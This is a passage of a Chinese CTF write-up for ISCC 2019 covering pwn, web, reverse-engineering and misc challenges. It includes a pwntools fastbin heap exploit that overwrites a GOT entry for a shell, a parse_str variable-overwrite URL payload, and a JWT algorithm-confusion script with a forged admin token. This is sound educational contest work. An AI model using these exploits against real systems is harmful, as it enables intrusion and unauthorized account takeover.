+<p>先malloc两个0x30的chunk，看一下堆：</p>
+<p><img src="/2019/05/01/ISCC-2019-WP/2.png" alt="img"></p>
+<p>然后把它们free掉：</p>
+<p><img src="/2019/05/01/ISCC-2019-WP/3.png" alt="img"></p>
+<p>接着再malloc一个堆块，利用gets造成的堆溢出来伪造前一个fastbin的fd指针，使其指向got表</p>
+<p>这里要注意伪造的chunk低32位地址必须是正确的大小，即0x40，利用地址对齐选一个合适的地址：</p>
+<p>把<code>\x00\x00\x73\x68\x00\x00</code>作为pattern写入got，然后覆盖malloc的got地址为后门函数的地址，设置参数为sh的地址即可getshell</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn02'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(i,s)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.send(<span class="string">'1 %d\n48 %s'</span>%(i,s)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.send(<span class="string">'2 %d'</span>%x+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">'bbbbbbbb'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">56</span> + p64(<span class="number">0x41</span>) + p64(<span class="number">0x600e02</span>))</span><br><span class="line">malloc(<span class="number">3</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">malloc(<span class="number">4</span>, <span class="string">'\x00\x00\x73\x68\x00\x00'</span> + p64(<span class="number">0x400856</span>)) <span class="comment"># write in sh() address</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'1 5\n 6295060\n'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0000000000400948 malloc</span></span><br><span class="line"><span class="comment"># 0000000000400989 free</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b *0x400948 </span></span><br><span class="line"><span class="comment"># b *0x400989</span></span><br></pre></td></tr></table></figure>
+<h3 id="web1-1"><a href="#web1-1" class="headerlink" title="web1"></a>web1</h3><p>给了源码，要绕过：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>); </span><br><span class="line">$hashed_key = <span class="string">'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'</span>; </span><br><span class="line">$parsed = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($parsed[<span class="string">"query"</span>]))&#123; </span><br><span class="line">    $query = $parsed[<span class="string">"query"</span>]; </span><br><span class="line">    $parsed_query = parse_str($query); </span><br><span class="line">    <span class="keyword">if</span>($parsed_query!=<span class="keyword">NULL</span>)&#123; </span><br><span class="line">        $action = $parsed_query[<span class="string">'action'</span>]; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($action===<span class="string">"auth"</span>)&#123; </span><br><span class="line">        $key = $_GET[<span class="string">"key"</span>]; </span><br><span class="line">        $hashed_input = hash(<span class="string">'sha256'</span>, $key); </span><br><span class="line">        <span class="keyword">if</span>($hashed_input!==$hashed_key)&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;img src='cxk.jpg'&gt;"</span>); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用<code>parse_str</code>进行变量覆盖，我这里覆盖为字符1的sha1</p>
+<p>最终payload：</p>
+<p><code>http://39.100.83.188:8066/?hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;action=auth&amp;key=1</code></p>
+<h3 id="re1-1"><a href="#re1-1" class="headerlink" title="re1"></a>re1</h3><p>ida一把梭 找到密文：<code>@1DE!440S9W9,2T%Y07=%&lt;W!Z.3!:1T%S2S-),7</code></p>
+<p>看一眼加密算法，三层加密，第一层根据密码表可以看出是base64</p>
+<p>第二层是一波变换，加密算法：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( *s )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = *s;</span><br><span class="line">  <span class="keyword">if</span> ( *s &lt;= <span class="number">64</span> || v4 &gt; <span class="number">90</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">96</span> || v4 &gt; <span class="number">122</span> )</span><br><span class="line">      *v5 = *s;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      *v5 = (v4 - <span class="number">84</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v5 = (v4 - <span class="number">52</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ++v5;</span><br><span class="line">  ++s;</span><br><span class="line">&#125;</span><br><span class="line">*v5 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>据此写出解密算法：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">''</span></span><br><span class="line">m = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> ord(i) &lt;= <span class="number">64</span> <span class="keyword">or</span> ord(i) &gt; <span class="number">90</span>:</span><br><span class="line">        <span class="keyword">if</span> ord(i) &lt;= <span class="number">96</span> <span class="keyword">or</span> ord(i) &gt; <span class="number">122</span>:</span><br><span class="line">            m += i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m += chr((ord(i) - <span class="number">84</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m += chr((ord(i) - <span class="number">52</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
+<p>第三层加密有点长啊草…应该是某种算法，太菜了看不出来，开动态调试加密一下<code>12345</code>看看：</p>
+<p><code>ZGVmAQH=</code> ——–&gt; <code>(6D=6;4%12#T</code> -&gt; <code>2836443D363B342531322354</code><br>           -base64-&gt; <code>WkdWbUFRSD0=</code><br><code>ZGVmAQH2</code> ——–&gt; <code>(6D=6;4%12#(</code> -&gt; <code>2836443D363B342531322328</code><br>           ——–&gt; <code>WkdWbUFRSDI=</code></p>
+<p>结果和<code>@1DE!440S9W9,2T%Y07=%&lt;W!Z.3!:1T%S2S-),7-$/3T\x20\x00</code>比对</p>
+<p>查到了, 是uudecode加密,逆向算法还是太菜了…</p>
+<p>在线解得<code>FIAQD3gvLKAyAwEspz90ZGAsK3I1sD</code></p>
+<p>然后</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">'FIAQD3gvLKAyAwEspz90ZGAsK3I1sD'</span></span><br><span class="line">m = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> ord(i) &lt;= <span class="number">64</span> <span class="keyword">or</span> ord(i) &gt; <span class="number">90</span>:</span><br><span class="line">        <span class="keyword">if</span> ord(i) &lt;= <span class="number">96</span> <span class="keyword">or</span> ord(i) &gt; <span class="number">122</span>:</span><br><span class="line">            m += i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m += chr((ord(i) - <span class="number">84</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m += chr((ord(i) - <span class="number">52</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(m + <span class="string">'=='</span>))</span><br></pre></td></tr></table></figure>
+<h3 id="re2-1"><a href="#re2-1" class="headerlink" title="re2"></a>re2</h3><p>是个pyc，使用uncompyle6可以反编译，然后写解密代码即可：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.3.2</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.5.2 (default, Nov 12 2018, 13:43:14) </span></span><br><span class="line"><span class="comment"># [GCC 5.4.0 20160609]</span></span><br><span class="line"><span class="comment"># Embedded file name: flag.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2019-02-20 22:39:31</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(f)</span>:</span></span><br><span class="line">    f = base64.b64decode(f)</span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        x = ord(i) - <span class="number">16</span></span><br><span class="line">        x = x ^ <span class="number">32</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'eYNzc2tjWV1gXFWPYGlTbQ=='</span></span><br><span class="line">print(decode(correct))</span><br></pre></td></tr></table></figure>
+<h3 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h3><p>是个.net程序，用dnspy反编译以后，找到一堆静态数字，尝试转成ASCII得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = [&apos;102&apos;, &apos;108&apos;, &apos;97&apos;, &apos;103&apos;, &apos;123&apos;, &apos;83&apos;, &apos;84&apos;, &apos;48&apos;, &apos;82&apos;, &apos;73&apos;, &apos;78&apos;, &apos;71&apos;, &apos;95&apos;, &apos;83&apos;, &apos;84&apos;, &apos;65&apos;, &apos;84&apos;, &apos;49&apos;, &apos;67&apos;, &apos;95&apos;, &apos;80&apos;, &apos;65&apos;, &apos;53&apos;, &apos;53&apos;, &apos;87&apos;, &apos;79&apos;, &apos;82&apos;, &apos;68&apos;, &apos;83&apos;, &apos;95&apos;, &apos;49&apos;, &apos;78&apos;, &apos;95&apos;, &apos;70&apos;, &apos;73&apos;, &apos;76&apos;, &apos;51&apos;, &apos;83&apos;, &apos;95&apos;, &apos;49&apos;, &apos;83&apos;, &apos;95&apos;, &apos;78&apos;, &apos;48&apos;, &apos;84&apos;, &apos;95&apos;, &apos;83&apos;, &apos;51&apos;, &apos;67&apos;, &apos;85&apos;, &apos;82&apos;, &apos;51&apos;, &apos;125&apos;]</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in a:</span><br><span class="line">    flag += chr(int(i, 10))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>给了一个表面exe，丢Linux用<code>strings runable.exe</code>可以读到一个base64串，解了发现是个PNG</p>
+<p>转成PNG保存即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">c = <span class="string">'iVBORw0KGgAAAAANSUhEUgAAASkAAAEpAQAAAADn4ukvAAACAklEQVR4nO2aQY6bQBBF3wdLsGvvsoSb4JzM+GbmCLmBvcwOFpFAMvwsIJ5ZjsRkcEj3BlR6Un9apa+qLmQ+sC7JRyiIWMQiFrGIfRjrNK+yy0eJi0oYl1i+sbY9YJlt+0roDgBVcwTZttvNte0BGyXV0OXInC9VCyCpfAFt+8FCn04s2ftlm/4/WBcGSTrR5V+36Z6xw/xIDTSELpsSzt/L0I5goNtQ2w6w+XgHAVB034bUguJH/stzLNtO216w4HndGA5gne5H0iXWb6xtN9hFZejTUfKV0I8Jqpuyi3XvJ2FnNwpDaqhuz2CI2bsG4+kA9rVwjwyVW9IJ+7p0HPUrf8IrY8ytWTrhurqxWO6NzDZUt9mW4/Guw8bU0JSAxeVUtACO3rsWW7J38QT3sycUbfbQWxrH7F2HZZ6ARgoPWTWEHmvJ5421/dPY0rXhxHAvB2kyzf34M9ekjbXtBxtTS6pa0gnVFPcci3NsK1Zi+P1qM0+8qxwo2ui9q7HntCJ0SlimFQmcfdtc2x6wP9OKLjw0Jy3pBHA/bq5tD9gyrViGQdyPgyRoqui9n4llD0u+QvYA1xDbis/EhoPsGkJ3kLmcvmTTHWMsBYM9X+nMlw92nz5riVg5rMUGzSM2siFBvgJYql9B2z+NHQDC23986fKaPTDE+96IRSxiEfsb2G/jeCyvdHD3rQAAAABJRU5ErkJggg=='</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'img.png'</span>, <span class="string">'wb'</span>)</span><br><span class="line">f.write(b64decode(c))</span><br></pre></td></tr></table></figure>
+<p>文件头里有一个字节错误，找个正常图片打开改一下即可得到一个二维码 扫描得flag</p>
+<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>二维码扫描解base64得到一个密码，然后用binwalk分离图片得到压缩包，压缩包密码是前面得到的密码，即可得到flag</p>
+<h3 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h3><p>脚本：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line">s = <span class="string">'蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條'</span></span><br><span class="line"></span><br><span class="line">s = s.replace(<span class="string">'蓅烺計劃 洮蓠朩暒'</span>, <span class="string">'0'</span>)</span><br><span class="line">s = s.replace(<span class="string">'戶囗  萇條'</span>, <span class="string">'1'</span>)</span><br><span class="line">b = [s[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">8</span>)]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag += chr((int(i, <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>
+<h3 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h3><p>1234567836275184</p>
+<h2 id="第三周"><a href="#第三周" class="headerlink" title="第三周"></a>第三周</h2><p>没赶得上放题orz，点开都是几百solve了，国内的ctf真的这么强吗</p>
+<h3 id="rev03"><a href="#rev03" class="headerlink" title="rev03"></a>rev03</h3><p>C#的窗口程序，dnspy一把梭，逻辑是输入FONZY输出flag</p>
+<h3 id="rev04"><a href="#rev04" class="headerlink" title="rev04"></a>rev04</h3><h3 id="最危险的地方就是最安全的地方"><a href="#最危险的地方就是最安全的地方" class="headerlink" title="最危险的地方就是最安全的地方"></a>最危险的地方就是最安全的地方</h3><p>文件头第一个字节改成ff修复</p>
+<p>末尾有一段unknown padding，有PK字样，应该是压缩包</p>
+<p>binwalk一把梭得到50张二维码</p>
+<p>第50张是jpg，里面有flag</p>
+<h3 id="High起来！"><a href="#High起来！" class="headerlink" title="High起来！"></a>High起来！</h3><p>binwalk一把梭得到一个二维码和一个mp3</p>
+<p>二维码内容是当铺密码，用MP3Stego解密后url解码即可</p>
+<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>提示Union.373，尝试修改UA，设置成<code>M Union.373</code>即可</p>
+<p>然后post输入用户名密码，提示flag是密码，发现存在注入，过滤了左右括号和等于号以及注释符，使用order by方法拿flag即可</p>
+<p>参考: <a href="https://www.cnblogs.com/deen-/p/7008939.html">https://www.cnblogs.com/deen-/p/7008939.html</a></p>
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>要登录admin，注册一个号以后发现有jwt，在<code>https://jwt.io/</code>解密</p>
+<p><img src="/2019/05/01/ISCC-2019-WP/1.png" alt="img"></p>
+<p>RS256方式，需要密钥，在common.js里可以看到获取方法:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getpubkey</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;md5(username+password)&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么路径是<code>url/pubkey/7ddd87ba87514cd838a5c048f649228e</code></p>
+<p>得到<code>{&quot;pubkey&quot;:&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----&quot;,&quot;result&quot;:true}</code></p>
+<p>更改加密方式为HS256并直接用公钥加密</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = <span class="string">"\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n"</span>.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"1nv0k3r"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure>
+<p>得到<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMW52MGszciIsInByaXYiOiJhZG1pbiJ9.w3EBXrNXrG6RQyIISniJXyOSK6CIF_FzpqrJEviXFDk</code></p>
+<p>然后按common.js里的方法访问即可<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">paste</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> content = <span class="built_in">escape</span>($(<span class="string">"#content"</span>).val());</span><br><span class="line">    token = <span class="built_in">window</span>.localStorage.getItem(<span class="string">"token"</span>);</span><br><span class="line">    <span class="keyword">if</span> (token==<span class="literal">null</span>||token==<span class="literal">undefined</span>)&#123;</span><br><span class="line">        alert(<span class="string">"u must login first"</span>);</span><br><span class="line">        <span class="built_in">window</span>.location.href = <span class="string">"/"</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    auth = <span class="string">"iscc19 "</span> + token;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'/paste'</span>,</span><br><span class="line">        type: <span class="string">'POST'</span>,</span><br><span class="line">        headers:&#123;<span class="string">"Authorization"</span>:auth&#125;,</span><br><span class="line">        data: &#123;<span class="string">"content"</span>: content&#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">    .success(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        result = data.result;</span><br><span class="line">        <span class="keyword">if</span>(result)&#123;</span><br><span class="line">            alert(<span class="string">"u can open it with:"</span> + <span class="string">"/text/"</span> + data.link);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            alert(<span class="string">"paste fail"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Rev04"><a href="#Rev04" class="headerlink" title="Rev04"></a>Rev04</h3><p><a href="http://ISCC2019{url_seems_rotten_with}ctf.com">http://ISCC2019{url_seems_rotten_with}ctf.com</a></p>
+<h3 id="web5-1"><a href="#web5-1" class="headerlink" title="web5"></a>web5</h3><p>flag{1SCC_2OI9}</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一周"><span class="toc-number">1.</span> <span class="toc-text">第一周</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1"><span class="toc-number">1.1.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web1"><span class="toc-number">1.2.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-number">1.3.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re1"><span class="toc-number">1.4.</span> <span class="toc-text">re1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re2"><span class="toc-number">1.5.</span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-50"><span class="toc-number">1.6.</span> <span class="toc-text">misc 50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-100"><span class="toc-number">1.7.</span> <span class="toc-text">misc 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-200"><span class="toc-number">1.8.</span> <span class="toc-text">misc 200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc300"><span class="toc-number">1.9.</span> <span class="toc-text">misc300</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc400"><span class="toc-number">1.10.</span> <span class="toc-text">misc400</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二周"><span class="toc-number">2.</span> <span class="toc-text">第二周</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn02"><span class="toc-number">2.1.</span> <span class="toc-text">pwn02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web1-1"><span class="toc-number">2.2.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re1-1"><span class="toc-number">2.3.</span> <span class="toc-text">re1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re2-1"><span class="toc-number">2.4.</span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re3"><span class="toc-number">2.5.</span> <span class="toc-text">re3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc1"><span class="toc-number">2.6.</span> <span class="toc-text">misc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc2"><span class="toc-number">2.7.</span> <span class="toc-text">misc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome"><span class="toc-number">2.8.</span> <span class="toc-text">welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mobile"><span class="toc-number">2.9.</span> <span class="toc-text">mobile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三周"><span class="toc-number">3.</span> <span class="toc-text">第三周</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rev03"><span class="toc-number">3.1.</span> <span class="toc-text">rev03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rev04"><span class="toc-number">3.2.</span> <span class="toc-text">rev04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最危险的地方就是最安全的地方"><span class="toc-number">3.3.</span> <span class="toc-text">最危险的地方就是最安全的地方</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High起来！"><span class="toc-number">3.4.</span> <span class="toc-text">High起来！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web5"><span class="toc-number">3.5.</span> <span class="toc-text">web5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web6"><span class="toc-number">3.6.</span> <span class="toc-text">web6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rev04"><span 